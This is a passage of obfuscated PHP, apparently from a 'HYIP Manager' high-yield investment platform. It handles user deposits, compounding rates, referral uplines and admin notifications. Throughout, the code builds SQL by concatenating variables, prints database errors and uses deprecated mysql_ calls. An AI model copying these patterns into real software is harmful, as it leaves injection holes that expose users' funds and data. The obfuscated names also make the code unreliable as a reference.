                                                                            $elnlcRMwb = sprintf ('%.02f', $elnlcWodOE[$elnlcsyENS['elnlccdExO']]);
                                                                            if ($elnlcxRMia)
                                                                            {
                                                                              if ($elnlcgNwD[$elnlcsyENS['elnlcDxJb']] == 1)
                                                                              {
                                                                                $elnlcnGUUn = preg_split ('/\\s*,\\s*/', $elnlcgNwD[$elnlcsyENS['elnlcDexfh']]);
                                                                                if (!in_array ($elnlcRMwb, $elnlcnGUUn))
                                                                                {
                                                                                  $elnlcRMwb = $elnlcnGUUn[0];
                                                                                }
                                                                              }
                                                                              else
                                                                              {
                                                                                if ($elnlcRMwb < $elnlcgNwD[$elnlcsyENS['elnlcORJuw']])
                                                                                {
                                                                                  $elnlcRMwb = $elnlcgNwD[$elnlcsyENS['elnlcORJuw']];
                                                                                }

                                                                                if ($elnlcgNwD[$elnlcsyENS['elnlcyDBs']] < $elnlcRMwb)
                                                                                {
                                                                                  $elnlcRMwb = $elnlcgNwD[$elnlcsyENS['elnlcyDBs']];
                                                                                }
                                                                              }
                                                                            }

                                                                            $elnlcncrs = $elnlcWodOE[$elnlcsyENS['elnlcVLuoO']];
                                                                            $elnlcNFSm = serialize ($elnlcncrs);
                                                                            if ($elnlcpazb == -1)
                                                                            {
                                                                              $elnlcpazb = $elnlcsyENS['elnlcmjUx'];
                                                                            }

                                                                            $q = 'insert into hm2_pending_deposits set
            user_id = \'' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . '\',
            `fields` = \'' . elnlcnczen ($elnlcNFSm) . ('' . '\',
            ec = ' . $elnlcQTTo . ',
            amount = ' . $elnlcrUqv . ',
            type_id = ' . $elnlcpazb . ',
            date = now(),
            status = \'new\',
            compound = ' . $elnlcRMwb);
                                                                            (mysql_query ($q) OR print mysql_error ());
                                                                            $elnlcNFSm = '';
                                                                            $elnlcncrs = unserialize ($elnlcQACRu[$elnlcsyENS['elnlceOeM']]);
                                                                            foreach ($elnlcncrs as $elnlckapu => $elnlciAbM)
                                                                            {
                                                                              $elnlcNFSm .= '' . $elnlciAbM . ': ' . $elnlcWodOE[$elnlcsyENS['elnlcVLuoO']][$elnlckapu] . '
';
                                                                            }

                                                                            $elnlcRuFoK = array ();
                                                                            $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
                                                                            $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
                                                                            $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = number_format ($elnlcrUqv, 2);
                                                                            $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[$elnlcQTTo][$elnlcsyENS['elnlcmjdk']];
                                                                            $elnlcRuFoK[$elnlcsyENS['elnlcVLuoO']] = $elnlcNFSm;
                                                                            $elnlcRuFoK[$elnlcsyENS['elnlcwKttz']] = $elnlcButH;
                                                                            $elnlcRuFoK[$elnlcsyENS['elnlccdExO']] = $elnlcRMwb;
                                                                            $q = 'select date_format(now() + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour, \'%b-%e-%Y %r\') as date';
                                                                            $elnlchGkPU = mysql_query ($q);
                                                                            $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                                                                            $elnlcRuFoK[$elnlcsyENS['elnlcmRJV']] = $elnlcCgqPK[$elnlcsyENS['elnlcmRJV']];
                                                                            $q = 'select email from hm2_users where id = 1';
                                                                            $elnlchGkPU = mysql_query ($q);
                                                                            $elnlcVVgTd = mysql_fetch_array ($elnlchGkPU);
                                                                            elnlcsius ('pending_deposit_admin_notification', $elnlcVVgTd[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcuuOBt']], $elnlcRuFoK);
                                                                            if ($elnlcpazb == 0)
                                                                            {
                                                                              header ('Location: ?a=add_funds&say=deposit_saved');
                                                                            }
                                                                            else
                                                                            {
                                                                              header ('Location: ?a=deposit&say=deposit_saved');
                                                                            }
                                                                          }

                                                                          $elnlcRMwb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlccdExO']]);
                                                                          $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']] = preg_replace ('/#amount#/', number_format ($elnlcrUqv, 2), $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']]);
                                                                          $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']] = preg_replace ('/#username#/', $elnlcgcnET[$elnlcsyENS['elnlczWew']], $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']]);
                                                                          $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']] = preg_replace ('/#email#/', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']]);
                                                                          $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']] = preg_replace ('/#id#/', $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']], $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']]);
                                                                          $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']] = preg_replace ('/#name#/', $elnlcgcnET[$elnlcsyENS['elnlcmjdk']], $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']]);
                                                                          $elnlcfhFg->assign ('description', $elnlcQACRu[$elnlcsyENS['elnlcgHJzN']]);
                                                                          $elnlcncrs = unserialize ($elnlcQACRu[$elnlcsyENS['elnlceOeM']]);
                                                                          $elnlcNFSm = array ();
                                                                          foreach ($elnlcncrs as $elnlckapu => $elnlciAbM)
                                                                          {
                                                                            array_push ($elnlcNFSm, array ('id' => $elnlckapu, 'name' => $elnlciAbM));
                                                                          }

                                                                          $elnlcfhFg->assign ('fields', $elnlcNFSm);
                                                                          $elnlcfhFg->assign ('ok', $elnlcwedHs);
                                                                          $elnlcfhFg->assign ('h_id', $elnlcpazb);
                                                                          $elnlcfhFg->assign ('amount', number_format ($elnlcrUqv, 2));
                                                                          $elnlcfhFg->assign ('famount', $elnlcrUqv);
                                                                          $elnlcfhFg->assign ('compounding', $elnlcRMwb);
                                                                          $elnlcfhFg->assign ('ps', $elnlcQTTo);
                                                                          $elnlcfhFg->assign ('type', $elnlcWodOE[$elnlcsyENS['elnlcsMIe']]);
                                                                          $elnlcfhFg->assign ('cname', $elnlcGPfS[$elnlcQTTo][$elnlcsyENS['elnlcmjdk']]);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcwOTE']);
                                                                          print base64_decode ('Cg==
');
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }

                    elnlcnooln ($elnlcUazB);
                    exit ();
                  }
                  else
                  {
                    $q = '' . 'select * from hm2_types where id = ' . $elnlcpazb . ' and closed = 0';
                    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                    $elnlcgNwD = mysql_fetch_array ($elnlchGkPU);
                    if (!$elnlcgNwD)
                    {
                      $elnlcfhFg->assign ('false_data', 1);
                    }
                    else
                    {
                      $elnlcButH = $elnlcgNwD[$elnlcsyENS['elnlcmjdk']];
                      $elnlcfhFg->assign ('plan_name', $elnlcButH);
                    }

                    if (0 < $elnlcgNwD[$elnlcsyENS['elnlcojty']])
                    {
                      $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and status = \'on\' and type_id = ' . $elnlcpazb;
                      $elnlchGkPU = mysql_query ($q);
                      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                      if ($elnlcgNwD[$elnlcsyENS['elnlcojty']] <= $elnlcCgqPK[$elnlcsyENS['elnlchvME']])
                      {
                        $elnlcfhFg->assign ('type', $elnlcgNwD);
                        $elnlcfhFg->display ($elnlcsyENS['elnlctnrsW']);
                        elnlcnooln ($elnlcUazB);
                        exit ();
                      }
                    }

                    if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcOqItU'])
                    {
                      $elnlcUxHw = $elnlcsyENS['elnlcmjUx'];
                      $q = '' . 'select actual_amount from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' order by deposit_date desc limit 0,1';
                      $elnlchGkPU = mysql_query ($q);
                      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                      {
                        $elnlcUxHw = $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']];
                      }

                      if ($elnlcgcnET[$elnlcsyENS['elnlcJtvsi']] == 1)
                      {
                        $elnlcUxHw = $elnlcsyENS['elnlcmjUx'];
                      }

                      if (0 < $elnlcUxHw)
                      {
                        $elnlcrGSp = $elnlcsyENS['elnlcmjUx'];
                        $q = '' . 'select t.id, p.min_amount, p.max_amount from hm2_plans as p, hm2_types as t where p.parent = t.id and t.closed = 0 and t.status = \'on\' and p.min_deposit <= ' . $elnlcUxHw . ' and (p.max_deposit == 0 || p.max_deposit >= ' . $elnlcUxHw . ') limit 0, 1';
                        $elnlchGkPU = mysql_query ($q);
                        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                        {
                          if ($elnlcrUqv < $elnlcCgqPK[$elnlcsyENS['elnlcIrOA']])
                          {
                            $elnlcrUqv = $elnlcCgqPK[$elnlcsyENS['elnlcIrOA']];
                          }

                          if (($elnlcCgqPK[$elnlcsyENS['elnlcxULH']] != 0 AND $elnlcCgqPK[$elnlcsyENS['elnlcxULH']] < $elnlcrUqv))
                          {
                            $elnlcrUqv = $elnlcCgqPK[$elnlcsyENS['elnlcxULH']];
                            continue;
                          }
                        }
                      }
                    }

                    $elnlcxRMia = $elnlcsyENS['elnlcmjUx'];
                    if ($elnlcgNwD[$elnlcsyENS['elnlcvNkQ']])
                    {
                      if ($elnlcgNwD[$elnlcsyENS['elnlcdzAd']] == 0)
                      {
                        $elnlcgNwD[$elnlcsyENS['elnlcdzAd']] = $elnlcrUqv + 1;
                      }

                      if (($elnlcgNwD[$elnlcsyENS['elnlcqQISr']] <= $elnlcrUqv AND $elnlcrUqv <= $elnlcgNwD[$elnlcsyENS['elnlcdzAd']]))
                      {
                        $elnlcxRMia = $elnlcsyENS['elnlctNxTK'];
                        if ($elnlcgNwD[$elnlcsyENS['elnlcDxJb']] == 1)
                        {
                          $elnlcnGUUn = preg_split ('/\\s*,\\s*/', $elnlcgNwD[$elnlcsyENS['elnlcDexfh']]);
                          $elnlcdALE = array ();
                          foreach ($elnlcnGUUn as $elnlcvRHDg)
                          {
                            array_push ($elnlcdALE, sprintf ('%d', $elnlcvRHDg));
                          }

                          sort ($elnlcdALE);
                          $elnlcqsuFJ = array ();
                          foreach ($elnlcdALE as $elnlcvRHDg)
                          {
                            array_push ($elnlcqsuFJ, array ('percent' => sprintf ('%d', $elnlcvRHDg)));
                          }

                          $elnlcfhFg->assign ('compound_percents', $elnlcqsuFJ);
                        }
                        else
                        {
                          $elnlcfhFg->assign ('compound_min_percents', $elnlcgNwD[$elnlcsyENS['elnlcORJuw']]);
                          $elnlcfhFg->assign ('compound_max_percents', $elnlcgNwD[$elnlcsyENS['elnlcyDBs']]);
                        }
                      }
                    }

                    $elnlcfhFg->assign ('use_compound', $elnlcxRMia);
                    $q = '' . 'select count(id) as col, min(min_deposit) as min from hm2_plans where parent = ' . $elnlcpazb;
                    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                    $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                    if ($elnlcCgqPK)
                    {
                      if ($elnlcCgqPK[$elnlcsyENS['elnlckNCf']] == 0)
                      {
                        $elnlcfhFg->assign ('false_data', 1);
                      }

                      if ($elnlcrUqv < $elnlcCgqPK[$elnlcsyENS['elnlcisNwx']])
                      {
                        $elnlcrUqv = $elnlcCgqPK[$elnlcsyENS['elnlcisNwx']];
                      }
                    }
                    else
                    {
                      $elnlcfhFg->assign ('false_data', 1);
                    }

                    if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcEuerH'])
                    {
                      if (0 < $elnlcpazb)
                      {
                        $q = '' . 'select sum(actual_amount) as amnt from hm2_deposits where type_id = ' . $elnlcpazb . ' and status = \'on\' and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                        $elnlcFBNz = $elnlcsyENS['elnlcmjUx'];
                        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                        {
                          $elnlcFBNz = $elnlcCgqPK[$elnlcsyENS['elnlcTjxw']];
                        }

                        $q = '' . 'select * from hm2_types where id = ' . $elnlcpazb;
                        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                        $elnlcwJSi = $elnlcsyENS['elnlcmjUx'];
                        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                        {
                          $elnlcwJSi = $elnlcCgqPK[$elnlcsyENS['elnlcCmsD']];
                        }

                        if (0 < $elnlcwJSi)
                        {
                          if ($elnlcwJSi < $elnlcFBNz + $elnlcrUqv)
                          {
                            $elnlcUuFp = $elnlcwJSi - $elnlcFBNz;
                            $elnlcUuFp = ($elnlcUuFp < 0 ? 0 : $elnlcUuFp);
                            $elnlcfhFg->assign ('amount_can_deposit', $elnlcUuFp);
                            $elnlcfhFg->display ($elnlcsyENS['elnlcRtHuT']);
                            elnlcnooln ($elnlcUazB);
                            exit ();
                          }
                        }
                      }
                    }

                    $q = '' . 'select count(id) as col from hm2_plans where parent = ' . $elnlcpazb . ' and max_deposit = 0';
                    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                    $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                    if ($elnlcCgqPK)
                    {
                      if ($elnlcCgqPK[$elnlcsyENS['elnlckNCf']] <= 0)
                      {
                        $q = '' . 'select count(id) as col, max(max_deposit) as max from hm2_plans where parent = ' . $elnlcpazb;
                        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                        if ($elnlcCgqPK)
                        {
                          if ($elnlcCgqPK[$elnlcsyENS['elnlckNCf']] == 0)
                          {
                            $elnlcfhFg->assign ('false_data', 1);
                          }

                          if ($elnlcCgqPK[$elnlcsyENS['elnlcRfuvo']] < $elnlcrUqv)
                          {
                            $elnlcrUqv = $elnlcCgqPK[$elnlcsyENS['elnlcRfuvo']];
                          }
                        }
                        else
                        {
                          $elnlcfhFg->assign ('false_data', 1);
                        }
                      }

                      $q = '' . 'select * from hm2_plans where parent = ' . $elnlcpazb . ' and ' . $elnlcrUqv . ' >= min_deposit and (' . $elnlcrUqv . ' <= max_deposit or max_deposit = 0)';
                      $elnlchGkPU = mysql_query ($q);
                      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                      $elnlcCgqPK[$elnlcsyENS['elnlcdryi']] = $elnlcweII[$elnlcgNwD[$elnlcsyENS['elnlcdryi']]];
                      $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] = $elnlcgNwD[$elnlcsyENS['elnlcJSvGA']];
                      $elnlcfhFg->assign ('plan', $elnlcCgqPK);
                      $elnlcfhFg->assign ('h_id', $elnlcpazb);
                      $elnlcfhFg->assign ('amount', $elnlcrUqv);
                      $elnlcfhFg->assign ('account', $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][$elnlcQTTo]);
                      $elnlcfhFg->assign ('amount_format', number_format ($elnlcrUqv, 2));
                      $elnlcfhFg->assign ('compounding', sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlccdExO']]));
                      if (substr ($elnlcWodOE[$elnlcsyENS['elnlcsMIe']], 0, 8) == $elnlcsyENS['elnlciVebs'])
                      {
                        $elnlcwedHs = $elnlcsyENS['elnlctNxTK'];
                        $elnlcrUqv = sprintf ('%0.2f', $elnlcWodOE[$elnlcsyENS['elnlcyteO']]);
                        $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcSzzCf']]);
                        $elnlcgNwD = $elnlcWodOE[$elnlcsyENS['elnlcsMIe']];
                        $elnlciSebT = sprintf ('%d', substr ($elnlcWodOE[$elnlcsyENS['elnlcsMIe']], 8));
                        $elnlcEEGK = $elnlcsyENS['elnlcmjUx'];
                        if ($elnlcSuVc[$elnlcsyENS['elnlcHrRLP']] == 1)
                        {
                          $q = '' . 'select id from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          $elnlcadsc = array ();
                          $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                          {
                            array_push ($elnlcadsc, $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]);
                          }

                          $q = 'select sum(actual_amount) as amount from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ' and ec = ' . $elnlciSebT . ' and 
      deposit_id in (') . join (',', $elnlcadsc) . ') and 
      		(type=\'earning\' or 
      (type=\'deposit\' and (description like \'Compou%\' or description like \'<b>Archived transactions</b>:<br>Compound%\')));';
                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                          {
                            $elnlcEEGK = $elnlcCgqPK[$elnlcsyENS['elnlcyteO']];
                          }
                        }
                        else
                        {
                          if ($elnlcSuVc[$elnlcsyENS['elnlconhcz']] == 1)
                          {
                            $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and hm2_types.id = hm2_deposits.type_id and ec=' . $elnlciSebT . ' and hm2_deposits.deposit_date + interval hm2_types.hold day > now()';
                          }
                          else
                          {
                            $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and hm2_types.id = hm2_deposits.type_id and ec=' . $elnlciSebT;
                          }

                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          $elnlcadsc = array ();
                          $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                          {
                            $q = 'select sum(actual_amount) as amount from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ' and ec = ' . $elnlciSebT . ' and 
      	deposit_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] . ' and date > now() - interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcfQNGT']] . ' day and 
      		(type=\'earning\' or 
      	(type=\'deposit\' and (description like \'Compou%\' or description like \'<b>Archived transactions</b>:<br>Compound%\')));');
                            ($elnlcjSNE = mysql_query ($q) OR print mysql_error ());
                            while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                            {
                              $elnlcEEGK += $elnlcUpbus[$elnlcsyENS['elnlcyteO']];
                            }
                          }
                        }

                        $q = '' . 'select * from hm2_types where id = ' . $elnlcpazb . ' and closed = 0';
                        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                        $elnlcgNwD = mysql_fetch_array ($elnlchGkPU);
                        $elnlclfKQI = -1;
                        if (!$elnlcgNwD)
                        {
                          $elnlcfhFg->assign ('wrong_plan', 1);
                          $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                        }
                        else
                        {
                          $elnlcButH = $elnlcgNwD[$elnlcsyENS['elnlcmjdk']];
                          $elnlcfhFg->assign ('plan_name', $elnlcButH);
                          $elnlclfKQI += $elnlcgNwD[$elnlcsyENS['elnlcxfih']];
                        }

                        if ($elnlclfKQI < 0)
                        {
                          $elnlclfKQI = $elnlcsyENS['elnlcmjUx'];
                        }

                        $elnlcxRMia = $elnlcsyENS['elnlcmjUx'];
                        if ($elnlcgNwD[$elnlcsyENS['elnlcvNkQ']])
                        {
                          if ($elnlcgNwD[$elnlcsyENS['elnlcdzAd']] == 0)
                          {
                            $elnlcgNwD[$elnlcsyENS['elnlcdzAd']] = $elnlcrUqv + 1;
                          }

                          if (($elnlcgNwD[$elnlcsyENS['elnlcqQISr']] <= $elnlcrUqv AND $elnlcrUqv <= $elnlcgNwD[$elnlcsyENS['elnlcdzAd']]))
                          {
                            $elnlcxRMia = $elnlcsyENS['elnlctNxTK'];
                            if ($elnlcgNwD[$elnlcsyENS['elnlcDxJb']] == 1)
                            {
                              $elnlcnGUUn = preg_split ('/\\s*,\\s*/', $elnlcgNwD[$elnlcsyENS['elnlcDexfh']]);
                              $elnlcdALE = array ();
                              foreach ($elnlcnGUUn as $elnlcvRHDg)
                              {
                                array_push ($elnlcdALE, sprintf ('%d', $elnlcvRHDg));
                              }

                              sort ($elnlcdALE);
                              $elnlcqsuFJ = array ();
                              foreach ($elnlcdALE as $elnlcvRHDg)
                              {
                                array_push ($elnlcqsuFJ, array ('percent' => sprintf ('%d', $elnlcvRHDg)));
                              }

                              $elnlcfhFg->assign ('compound_percents', $elnlcqsuFJ);
                            }
                            else
                            {
                              $elnlcfhFg->assign ('compound_min_percents', $elnlcgNwD[$elnlcsyENS['elnlcORJuw']]);
                              $elnlcfhFg->assign ('compound_max_percents', $elnlcgNwD[$elnlcsyENS['elnlcyDBs']]);
                            }
                          }
                        }

                        $elnlcfhFg->assign ('use_compound', $elnlcxRMia);
                        $q = '' . 'select count(id) as col, min(min_deposit) as min from hm2_plans where parent = ' . $elnlcpazb;
                        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                        if ($elnlcCgqPK)
                        {
                          if ($elnlcCgqPK[$elnlcsyENS['elnlckNCf']] == 0)
                          {
                            $elnlcfhFg->assign ('wrong_plan', 1);
                            $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                          }

                          if ($elnlcrUqv < $elnlcCgqPK[$elnlcsyENS['elnlcisNwx']])
                          {
                            $elnlcfhFg->assign ('less_than_min', 1);
                            $elnlcfhFg->assign ('min_amount', number_format ($elnlcCgqPK[$elnlcsyENS['elnlcisNwx']], 2));
                            $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                          }
                        }
                        else
                        {
                          $elnlcfhFg->assign ('wrong_plan', 1);
                          $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                        }

                        $elnlcfhFg->assign ('type', $elnlcWodOE[$elnlcsyENS['elnlcsMIe']]);
                        $q = 'select sum(actual_amount) as sm, ec from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' group by ec';
                        $elnlchGkPU = mysql_query ($q);
                        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                        {
                          $elnlcGPfS[$elnlcCgqPK[$elnlcsyENS['elnlcyqyS']]][$elnlcsyENS['elnlcTcMv']] = $elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']];
                        }

                        $elnlcLOJT = elnlcmext ($elnlcgcnET[$elnlcsyENS['elnlcLbvLL']]);
                        $elnlcxdwm = $elnlcLOJT[$elnlcsyENS['elnlceleT']];
                        $q = '' . 'select min(max_deposit) as min, max(max_deposit) as max from hm2_plans where parent = ' . $elnlcpazb;
                        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                        if ($elnlcCgqPK)
                        {
                          if (0 < $elnlcCgqPK[$elnlcsyENS['elnlcisNwx']])
                          {
                            if ($elnlcCgqPK[$elnlcsyENS['elnlcRfuvo']] < $elnlcLOJT[$elnlcsyENS['elnlceleT']])
                            {
                              $elnlcxdwm = $elnlcCgqPK[$elnlcsyENS['elnlcRfuvo']];
                            }
                          }
                        }

                        $elnlcQTTo = substr ($elnlcWodOE[$elnlcsyENS['elnlcsMIe']], 8);
                        if ($elnlcGPfS[$elnlcQTTo][$elnlcsyENS['elnlcTcMv']] < $elnlcrUqv + $elnlcEEGK)
                        {
                          if ($elnlcrUqv <= $elnlcGPfS[$elnlcQTTo][$elnlcsyENS['elnlcTcMv']])
                          {
                            $elnlcfhFg->assign ('on_hold', 1);
                          }
                          else
                          {
                            $elnlcfhFg->assign ('not_enough_funds', 1);
                          }

                          $elnlcxdwm = $elnlcGPfS[$elnlcQTTo][$elnlcsyENS['elnlcTcMv']];
                          $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                        }

                        if ($elnlcxdwm < $elnlcrUqv)
                        {
                          $elnlcfhFg->assign ('max_deposit_less', 1);
                          $elnlcfhFg->assign ('max_deposit_format', number_format ($elnlcxdwm, 2));
                          $elnlcwedHs = $elnlcsyENS['elnlcmjUx'];
                        }

                        $elnlcfhFg->assign ('ps', $elnlcGPfS[$elnlcQTTo][$elnlcsyENS['elnlcmjdk']]);
                        if (($elnlcwedHs == 1 AND $elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcpcHa']))
                        {
                          $elnlciSebT = $elnlcQTTo;
                          $elnlcRMwb = sprintf ('%.02f', $elnlcWodOE[$elnlcsyENS['elnlccdExO']]);
                          if ($elnlcxRMia)
                          {
                            if ($elnlcgNwD[$elnlcsyENS['elnlcDxJb']] == 1)
                            {
                              $elnlcnGUUn = preg_split ('/\\s*,\\s*/', $elnlcgNwD[$elnlcsyENS['elnlcDexfh']]);
                              if (!in_array ($elnlcRMwb, $elnlcnGUUn))
                              {
                                $elnlcRMwb = $elnlcnGUUn[0];
                              }
                            }
                            else
                            {
                              if ($elnlcRMwb < $elnlcgNwD[$elnlcsyENS['elnlcORJuw']])
                              {
                                $elnlcRMwb = $elnlcgNwD[$elnlcsyENS['elnlcORJuw']];
                              }

                              if ($elnlcgNwD[$elnlcsyENS['elnlcyDBs']] < $elnlcRMwb)
                              {
                                $elnlcRMwb = $elnlcgNwD[$elnlcsyENS['elnlcyDBs']];
                              }
                            }
                          }

                          $q = 'insert into hm2_deposits set 
           user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ',
           type_id = ' . $elnlcpazb . ',
           deposit_date = now(),
           last_pay_date = now() + interval ' . $elnlclfKQI . ' day,
           status = \'on\',
           amount = ' . $elnlcrUqv . ',
           actual_amount = ' . $elnlcrUqv . ',
           compound = ' . $elnlcRMwb . ',
           ec = ' . $elnlciSebT . '
    ');
                          (mysql_query ($q) OR print mysql_error ());
                          $elnlcOMIk = mysql_insert_id ();
                          $q = 'insert into hm2_history set 
           user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ',
           amount = -' . $elnlcrUqv . ',
           actual_amount = -' . $elnlcrUqv . ',
           type=\'deposit\',
           date = now(),
           description = \'Deposit to ') . elnlcnczen ($elnlcButH) . ('' . '\',
           ec = ' . $elnlciSebT . ',
           deposit_id = ' . $elnlcOMIk . '
    ');
                          (mysql_query ($q) OR print mysql_error ());
                          $elnlcOzjJ = $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                          if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcOqItU'])
                          {
                            $q = '' . 'update hm2_users set reset = 0 where id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                            mysql_query ($q);
                          }

                          $elnlcVBEz = $elnlcsyENS['elnlcmjUx'];
                          if ($elnlcSuVc[$elnlcsyENS['elnlchaUU']] == 0)
                          {
                            $elnlcVBEz = elnlcriusr ($elnlcOzjJ, $elnlcrUqv, $elnlciSebT);
                          }

                          $q = '' . 'select * from hm2_users where id = ' . $elnlcOzjJ;
                          $elnlchGkPU = mysql_query ($q);
                          $elnlcKCjH = mysql_fetch_array ($elnlchGkPU);
                          $elnlcRuFoK = array ($elnlcKCjH);
                          $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcKCjH[$elnlcsyENS['elnlczWew']];
                          $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcKCjH[$elnlcsyENS['elnlcmjdk']];
                          $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = number_format ($elnlcrUqv, 2);
                          $elnlcRuFoK[$elnlcsyENS['elnlcJdSMq']] = $elnlcOPfeJ;
                          $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[$elnlciSebT][$elnlcsyENS['elnlcmjdk']];
                          $elnlcRuFoK[$elnlcsyENS['elnlcwuPu']] = 'Deposit from account balance';
                          $elnlcRuFoK[$elnlcsyENS['elnlccdExO']] = $elnlcRMwb;
                          $elnlcRuFoK[$elnlcsyENS['elnlcwKttz']] = elnlcenjk ($elnlciAbM);
                          $elnlcRuFoK[$elnlcsyENS['elnlcewfHM']] = $elnlcVBEz;
                          $elnlcRuFoK[$elnlcsyENS['elnlcdmmm']] = '[no upline]';
                          if (0 < $elnlcKCjH[$elnlcsyENS['elnlckGUEd']])
                          {
                            $q = '' . 'select * from hm2_users where id = ' . $elnlcKCjH[$elnlcsyENS['elnlckGUEd']];
                            ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                            while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                            {
                              $elnlcRuFoK[$elnlcsyENS['elnlcdmmm']] = $elnlcCgqPK[$elnlcsyENS['elnlczWew']];
                            }
                          }

                          $q = 'select email from hm2_users where id = 1';
                          $elnlchGkPU = mysql_query ($q);
                          $elnlcSWfu = '';
